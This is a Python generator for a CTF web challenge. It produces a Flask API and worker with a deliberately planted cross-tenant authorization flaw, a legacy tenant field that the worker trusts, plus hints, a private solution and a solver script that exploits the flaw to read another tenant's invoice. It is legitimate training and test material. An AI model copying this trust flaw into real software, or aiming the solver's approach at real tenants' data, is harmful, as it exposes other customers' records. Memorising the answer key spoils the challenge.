from __future__ import annotations

import random
import json
from dataclasses import dataclass

from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml


@dataclass(frozen=True)
class Variant:
    export_noun: str
    support_noun: str
    tenant_field: str
    attacker_tenant: str
    victim_tenant: str
    attacker_invoice: str
    victim_invoice: str
    attacker_user: str
    victim_user: str
    flag: str


def render_tenant_export(spec: ChallengeSpec, rng: random.Random) -> dict[str, str]:
    variant = _variant(rng)
    route_base = f"/api/{variant.export_noun}"
    support_route = f"/api/{variant.support_noun}"

    public_hints = [
        {"level": 1, "text": f"The {variant.support_noun} feed contains operational clues."},
        {"level": 2, "text": "Compare what the API validates with what the worker later trusts."},
        {"level": 3, "text": f"Look for a legacy JSON field named {variant.tenant_field}."},
    ]

    files = {
        "docker-compose.yml": _compose(),
        ".env.example": f"CTFGEN_FLAG={variant.flag}\n",
        "services/api/Dockerfile": _python_dockerfile("app.py"),
        "services/api/requirements.txt": "flask==3.0.3\nredis==5.0.8\n",
        "services/api/app.py": _api_app(variant, route_base, support_route),
        "services/worker/Dockerfile": _python_dockerfile("worker.py"),
        "services/worker/requirements.txt": "redis==5.0.8\n",
        "services/worker/worker.py": _worker(variant),
        "public/description.md": _description(spec, variant, route_base, support_route),
        "public/hints.yaml": dump_yaml({"hints": public_hints}),
        "private/solution.md": _solution(variant, route_base, support_route),
        "private/variant.json": _variant_json(variant, route_base, support_route),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "private/solver.py": _solver(variant, route_base, support_route),
        "tests/healthcheck.py": _healthcheck(),
        "tests/validate_solver.py": _validate_solver(),
        "tests/validate_variant.py": _validate_variant(variant),
    }
    return files


def _variant(rng: random.Random) -> Variant:
    export_noun = rng.choice(["exports", "bundles", "statements", "archives"])
    support_noun = rng.choice(["notices", "bulletins", "ops-feed", "service-notes"])
    tenant_field = rng.choice(["tenant_ref", "account_scope", "ledger_hint", "billing_realm"])
    attacker_tenant = rng.choice(["northstar", "atlas", "cobalt", "harbor"])
    victim_tenant = rng.choice(["globex", "initech", "umbra", "solstice"])
    if victim_tenant == attacker_tenant:
        victim_tenant = "globex"
    attacker_invoice = f"inv-{rng.randrange(1000, 9999)}-{_token_hex(rng, 2)}"
    victim_invoice = f"inv-{rng.randrange(1000, 9999)}-{_token_hex(rng, 2)}"
    flag = f"ctf{{tenant_worker_trust_{_token_hex(rng, 6)}}}"
    return Variant(
        export_noun=export_noun,
        support_noun=support_noun,
        tenant_field=tenant_field,
        attacker_tenant=attacker_tenant,
        victim_tenant=victim_tenant,
        attacker_invoice=attacker_invoice,
        victim_invoice=victim_invoice,
        attacker_user="alice",
        victim_user="brenda",
        flag=flag,
    )


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _variant_json(v: Variant, route_base: str, support_route: str) -> str:
    return json.dumps(
        {
            "family": "web_business_logic_tenant_export",
            "routes": {
                "export_base": route_base,
                "support": support_route,
            },
            "tokens": {
                "export_noun": v.export_noun,
                "support_noun": v.support_noun,
                "tenant_field": v.tenant_field,
                "attacker_tenant": v.attacker_tenant,
                "victim_tenant": v.victim_tenant,
                "attacker_invoice": v.attacker_invoice,
                "victim_invoice": v.victim_invoice,
                "attacker_user": v.attacker_user,
                "victim_user": v.victim_user,
            },
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


def _compose() -> str:
    return """services:
  redis:
    image: redis:7-alpine
    command: ["redis-server", "--save", "", "--appendonly", "no"]
    networks: [backend]
    read_only: true
    security_opt:
      - no-new-privileges:true

  api:
    build: ./services/api
    environment:
      REDIS_URL: redis://redis:6379/0
      CTFGEN_FLAG: ${CTFGEN_FLAG:-}
    ports:
      - "8080:8080"
    depends_on: [redis]
    networks:
      - frontend
      - backend
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

  worker:
    build: ./services/worker
    environment:
      REDIS_URL: redis://redis:6379/0
      CTFGEN_FLAG: ${CTFGEN_FLAG:-}
    depends_on: [redis]
    networks: [backend]
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

networks:
  frontend:
  backend:
    internal: true
"""


def _python_dockerfile(entrypoint: str) -> str:
    return f"""FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY {entrypoint} .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "{entrypoint}"]
"""


def _api_app(v: Variant, route_base: str, support_route: str) -> str:
    return f'''from __future__ import annotations

import json
import os
import time
import uuid

import redis
from flask import Flask, jsonify, request

app = Flask(__name__)
redis_client = redis.Redis.from_url(os.environ.get("REDIS_URL", "redis://redis:6379/0"), decode_responses=True)

FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"
TENANTS = {{
    "{v.attacker_user}": "{v.attacker_tenant}",
    "{v.victim_user}": "{v.victim_tenant}",
}}
INVOICES = {{
    "{v.attacker_invoice}": {{
        "tenant": "{v.attacker_tenant}",
        "owner": "{v.attacker_user}",
        "amount": "$142.10",
        "note": "Routine platform subscription.",
    }},
    "{v.victim_invoice}": {{
        "tenant": "{v.victim_tenant}",
        "owner": "{v.victim_user}",
        "amount": "$9,441.00",
        "note": f"Quarterly incident retainer. Flag: {{FLAG}}",
    }},
}}


def current_user():
    user = request.headers.get("X-User", "{v.attacker_user}").strip().lower()
    if user not in TENANTS:
        return None
    return user


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "api"}}


@app.get("/api/profile")
def profile():
    user = current_user()
    if user is None:
        return jsonify({{"error": "unknown user"}}), 403
    return jsonify({{
        "user": user,
        "tenant": TENANTS[user],
        "routes": {{
            "support": "{support_route}",
            "queue_export": "{route_base}/queue",
            "export_status": "{route_base}/status/<job_id>",
            "download": "{route_base}/download/<job_id>",
        }},
    }})


@app.get("{support_route}")
def support_feed():
    return jsonify({{
        "items": [
            {{
                "id": "ops-117",
                "severity": "low",
                "message": "Legacy export clients may still send {v.tenant_field}; worker compatibility remains enabled.",
            }},
            {{
                "id": "case-204",
                "severity": "medium",
                "message": "Delayed invoice {v.victim_invoice} for tenant {v.victim_tenant}; export worker retry scheduled.",
            }},
            {{
                "id": "audit-318",
                "severity": "info",
                "message": "Scanner findings against /debug/vars were remediated last quarter.",
            }},
        ]
    }})


@app.get("{route_base}/mine")
def my_invoices():
    user = current_user()
    if user is None:
        return jsonify({{"error": "unknown user"}}), 403
    tenant = TENANTS[user]
    visible = [
        {{"invoice_id": invoice_id, "tenant": row["tenant"], "amount": row["amount"]}}
        for invoice_id, row in INVOICES.items()
        if row["tenant"] == tenant
    ]
    return jsonify({{"invoices": visible}})


@app.post("{route_base}/queue")
def queue_export():
    user = current_user()
    if user is None:
        return jsonify({{"error": "unknown user"}}), 403
    body = request.get_json(force=True, silent=True) or {{}}
    invoice_id = str(body.get("invoice_id", ""))
    if invoice_id not in INVOICES:
        return jsonify({{"error": "unknown invoice"}}), 404

    user_tenant = TENANTS[user]
    requested_tenant = str(body.get("{v.tenant_field}", user_tenant))

    # Intentional vulnerability: the API keeps compatibility with legacy clients by
    # forwarding {v.tenant_field}. The worker later trusts that field as authoritative.
    if "{v.tenant_field}" not in body and INVOICES[invoice_id]["tenant"] != user_tenant:
        return jsonify({{"error": "invoice does not belong to your tenant"}}), 403

    job_id = str(uuid.uuid4())
    job = {{
        "job_id": job_id,
        "created_by": user,
        "requested_at": time.time(),
        "invoice_id": invoice_id,
        "{v.tenant_field}": requested_tenant,
    }}
    redis_client.hset(f"job:{{job_id}}", mapping={{"status": "queued", "created_by": user}})
    redis_client.rpush("export_jobs", json.dumps(job))
    return jsonify({{"job_id": job_id, "status": "queued"}}), 202


@app.get("{route_base}/status/<job_id>")
def export_status(job_id):
    user = current_user()
    job = redis_client.hgetall(f"job:{{job_id}}")
    if not job:
        return jsonify({{"error": "unknown job"}}), 404
    if job.get("created_by") != user:
        return jsonify({{"error": "job belongs to another user"}}), 403
    return jsonify(job)


@app.get("{route_base}/download/<job_id>")
def download(job_id):
    user = current_user()
    job = redis_client.hgetall(f"job:{{job_id}}")
    if not job:
        return jsonify({{"error": "unknown job"}}), 404
    if job.get("created_by") != user:
        return jsonify({{"error": "job belongs to another user"}}), 403
    if job.get("status") != "ready":
        return jsonify({{"error": "export is not ready", "status": job.get("status", "missing")}}), 409
    return jsonify({{"job_id": job_id, "export": job.get("export", "")}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
'''


def _worker(v: Variant) -> str:
    return f'''from __future__ import annotations

import json
import os
import time

import redis

redis_client = redis.Redis.from_url(os.environ.get("REDIS_URL", "redis://redis:6379/0"), decode_responses=True)
FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"

INVOICES = {{
    "{v.attacker_invoice}": {{
        "tenant": "{v.attacker_tenant}",
        "amount": "$142.10",
        "note": "Routine platform subscription.",
    }},
    "{v.victim_invoice}": {{
        "tenant": "{v.victim_tenant}",
        "amount": "$9,441.00",
        "note": f"Quarterly incident retainer. Flag: {{FLAG}}",
    }},
}}


def process(job):
    invoice_id = job["invoice_id"]
    trusted_tenant = job["{v.tenant_field}"]
    row = INVOICES.get(invoice_id)
    if not row or row["tenant"] != trusted_tenant:
        redis_client.hset(f"job:{{job['job_id']}}", mapping={{"status": "failed", "error": "invoice unavailable"}})
        return

    export = "\\n".join([
        "invoice_id=" + invoice_id,
        "tenant=" + row["tenant"],
        "amount=" + row["amount"],
        "note=" + row["note"],
    ])
    redis_client.hset(f"job:{{job['job_id']}}", mapping={{"status": "ready", "export": export}})


def main():
    while True:
        try:
            item = redis_client.blpop("export_jobs", timeout=5)
        except Exception:
            time.sleep(1)
            continue
        if not item:
            continue
        _, payload = item
        try:
            process(json.loads(payload))
        except Exception as exc:
            try:
                job = json.loads(payload)
                redis_client.hset(f"job:{{job['job_id']}}", mapping={{"status": "failed", "error": str(exc)}})
            except Exception:
                pass
        time.sleep(0.2)


if __name__ == "__main__":
    main()
'''


def _description(spec: ChallengeSpec, v: Variant, route_base: str, support_route: str) -> str:
    return f"""# {spec.title}

You have access to a tenant-scoped billing portal as `{v.attacker_user}`.

The company recently migrated invoice export jobs from the API service into a worker service. Your goal is to retrieve the flag from another tenant's invoice export without credentials for that tenant.

Start at:

- `GET /api/profile`
- `GET {support_route}`
- `GET {route_base}/mine`

Use the `X-User: {v.attacker_user}` request header. The flag format is `ctf{{...}}`.

This challenge is generated as a stateful business-logic variant. The exact route names, tenant names, invoice IDs, and legacy field names may differ across generated instances.
"""


def _solution(v: Variant, route_base: str, support_route: str) -> str:
    return f"""# Private Solution

The API blocks cross-tenant invoice exports only when the legacy field `{v.tenant_field}` is absent. If that field is supplied, the API forwards it to the worker. The worker trusts `{v.tenant_field}` as the invoice tenant and exports the invoice when the supplied tenant matches the invoice record.

Solve path:

1. Request `/api/profile` with `X-User: {v.attacker_user}`.
2. Read `{support_route}` and find victim invoice `{v.victim_invoice}` and tenant `{v.victim_tenant}`.
3. Queue an export:

```json
{{"invoice_id": "{v.victim_invoice}", "{v.tenant_field}": "{v.victim_tenant}"}}
```

4. Poll `{route_base}/status/<job_id>`.
5. Download `{route_base}/download/<job_id>` and extract the flag from the export body.

This is meant to teach authorization consistency across asynchronous service boundaries, not input filtering.
"""


def _solver(v: Variant, route_base: str, support_route: str) -> str:
    return f'''from __future__ import annotations

import argparse
import json
import re
import sys
import time
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--user", default="{v.attacker_user}")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    def get(path):
        req = request.Request(base + path, headers={{"X-User": args.user}})
        with request.urlopen(req, timeout=5) as response:
            return response.read().decode("utf-8")

    def post_json(path, payload):
        req = request.Request(
            base + path,
            data=json.dumps(payload).encode("utf-8"),
            headers={{"X-User": args.user, "Content-Type": "application/json"}},
            method="POST",
        )
        with request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode("utf-8"))

    get("/api/profile")
    profile = json.loads(get("/api/profile"))
    routes = profile["routes"]
    queue_route = routes["queue_export"]
    status_template = routes["export_status"]
    download_template = routes["download"]
    support_route = routes["support"]

    text = get(support_route)
    invoice_match = re.search(r"Delayed invoice (inv-[0-9]{{4}}-[0-9a-f]{{4}})", text)
    tenant_match = re.search(r"for tenant ([a-z]+)", text)
    field_match = re.search(r"may still send ([a-z_]+)", text)
    if not invoice_match or not tenant_match or not field_match:
        raise RuntimeError("could not find victim invoice metadata")

    invoice_id = invoice_match.group(1)
    tenant = tenant_match.group(1)
    tenant_field = field_match.group(1)

    queued = post_json(
        queue_route,
        {{"invoice_id": invoice_id, tenant_field: tenant}},
    )
    job_id = queued["job_id"]

    for _ in range(40):
        status = json.loads(get(status_template.replace("<job_id>", job_id)))
        if status.get("status") == "ready":
            break
        time.sleep(0.25)
    else:
        raise RuntimeError("export never became ready")

    download = get(download_template.replace("<job_id>", job_id))
    match = re.search(r"ctf\\{{[^}}]+\\}}", download)
    if not match:
        raise RuntimeError("flag not found")
    print(match.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    with request.urlopen(args.base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _validate_solver() -> str:
    return '''from __future__ import annotations

from pathlib import Path


def test_solver_mentions_flag_pattern():
    solver = Path("private/solver.py").read_text(encoding="utf-8")
    assert "ctf\\\\{" in solver
    assert "urllib" in solver
'''


def _validate_variant(v: Variant) -> str:
    return f'''from __future__ import annotations

from pathlib import Path


def test_variant_tokens_are_present():
    app = Path("services/api/app.py").read_text(encoding="utf-8")
    assert "{v.tenant_field}" in app
    assert "{v.victim_invoice}" in app
    assert "{v.victim_tenant}" in app
    assert "{v.attacker_tenant}" in app
'''
